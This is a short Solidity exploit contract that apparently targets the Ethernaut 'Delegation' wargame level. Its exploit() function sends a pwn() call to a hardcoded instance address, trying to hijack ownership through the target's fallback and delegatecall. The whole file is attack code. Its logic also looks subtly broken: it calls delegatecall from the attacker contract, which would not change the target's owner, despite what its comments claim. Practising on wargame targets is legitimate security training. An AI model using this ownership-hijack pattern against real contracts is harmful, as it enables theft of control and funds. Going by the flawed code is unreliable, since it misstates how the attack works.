pragma solidity ^0.8.0;

contract DelegationHack {
    event Response(bool success, bytes data);

    function exploit() public {
        // set the address below to the instance address of your Ethernaut level
        // this address points to your Delegation contract, not the Delegate contract
        address delegationContract = 0x1bB1cbfFf07356CF283609F331F6FBaA15178666;

        // we then try to call the pwn() function
        // since the function does not exist, it falls back to the fallback method
        (bool success, bytes memory data) = delegationContract.delegatecall(
            abi.encodeWithSignature("pwn()")
        );

        emit Response(success, data);
    }
}
